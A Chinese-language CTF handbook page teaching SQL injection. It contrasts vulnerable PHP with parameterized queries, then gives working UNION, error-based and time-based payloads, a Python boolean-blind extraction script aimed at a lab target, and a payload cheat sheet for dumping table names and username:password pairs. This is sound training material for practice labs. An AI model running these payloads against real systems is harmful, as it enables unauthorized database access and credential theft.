---
title: SQL 注入
order: 2
icon: material-symbols:database
category:
  - CTF
  - 手册
  - Web
---

SQL 注入就是把恶意的 SQL 代码塞进用户输入里，让数据库执行你想要的查询。用户输入本该只是数据，结果被当成命令执行了。

## 为什么会有 SQL 注入？

后端代码直接把用户输入拼进了 SQL 语句：

```php
// 危险写法
$sql = "SELECT * FROM users WHERE id = $id";

// 安全写法（参数化查询）
$stmt = $conn->prepare("SELECT * FROM users WHERE id = ?");
$stmt->bind_param("i", $id);
```

如果 `$id` 是 `1 OR 1=1`，危险写法的查询就变成了 `SELECT * FROM users WHERE id = 1 OR 1=1`，所有数据都出来了。

## 三步走：判断 → 定位 → 拿数据

### 第一步：判断有没有注入

在参数后面加单引号：

```
?id=1      → 页面正常
?id=1'     → 页面报错或内容变化 → 有注入
```

报错信息里出现 `SQL syntax` 之类的字样，基本确认了。

### 第二步：找列数和回显位

**确定有几列**（一直加数字直到报错）：

```sql
?id=1 ORDER BY 1  -- 正常
?id=1 ORDER BY 2  -- 正常
?id=1 ORDER BY 3  -- 正常
?id=1 ORDER BY 4  -- 报错 → 说明有 3 列
```

**找出哪些列会显示在页面上**：

```sql
?id=-1 UNION SELECT 1, 2, 3
```

页面上出现数字的位置就是回显位，把数字换成你要查的内容即可。

### 第三步：拿数据

```sql
-- 当前数据库名
?id=-1 UNION SELECT 1, database(), 3

-- 所有表名
?id=-1 UNION SELECT 1, GROUP_CONCAT(table_name), 3
FROM information_schema.tables WHERE table_schema=database()

-- 某张表的列名
?id=-1 UNION SELECT 1, GROUP_CONCAT(column_name), 3
FROM information_schema.columns WHERE table_name='users'

-- 拿数据
?id=-1 UNION SELECT 1, GROUP_CONCAT(username,':',password), 3 FROM users
```

`information_schema` 是 MySQL 自带的元数据库，存着所有库、表、列的名字。`GROUP_CONCAT` 把多行结果拼成一行。

## 没有回显怎么办？

### 报错注入（页面显示错误信息时）

```sql
?id=1 AND updatexml(1, concat(0x7e, (SELECT database()), 0x7e), 1)
```

`updatexml` 碰到错误的 XPath 路径会报错并把路径内容打印出来，我们故意塞给它一个非法路径，让它把查询结果"喷"出来。

### 布尔盲注（页面只有正常/异常两种状态）

逐字符猜解，每个字符最多 7 次请求（二分法）：

```python
import requests

url = "http://challenge/Less-8/?id=1"
result = ""

for pos in range(1, 20):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = url + f" AND ASCII(SUBSTR((SELECT database()),{pos},1))>{mid}"
        r = requests.get(payload)
        if "You are in" in r.text:  # 根据实际页面正常标志修改
            low = mid + 1
        else:
            high = mid
    if low == 32:
        break
    result += chr(low)
    print(f"当前结果: {result}")
```

### 时间盲注（页面内容完全一致时）

```sql
?id=1 AND IF(ASCII(SUBSTR((SELECT database()),1,1))>100, SLEEP(3), 0)
```

延迟 3 秒说明条件为真。

## 常用 Payload 速查

| 场景 | Payload |
|------|---------|
| 判断注入 | `'` 或 `1'` |
| 注释符 | `--` 或 `#` 或 `/**/` |
| 联合查询 | `UNION SELECT 1,2,3` |
| 数据库名 | `database()` |
| 所有表 | `GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()` |
| 报错注入 | `updatexml(1,concat(0x7e,(payload),0x7e),1)` |

::: note 课后练习
课后练习需要你连接校园网才能访问内网练习平台。
:::

## 课后练习

- [你好，数据库](http://172.16.173.140/training/11?challenge=39) — 一个登录框，尝试用 SQL 注入绕过认证或读取数据

## 练手去哪？

- [sqli-labs](https://github.com/Audi-1/sqli-labs) — 经典靶场，从 Less-1 开始
- [CTFHub](https://www.ctfhub.com/) — 技能树里的 SQL 注入关

::: warning
先手工搞懂每个 Payload 在干什么，再用 Sqlmap。比赛中很多题目专门防了 Sqlmap，手工能力是唯一出路。
:::
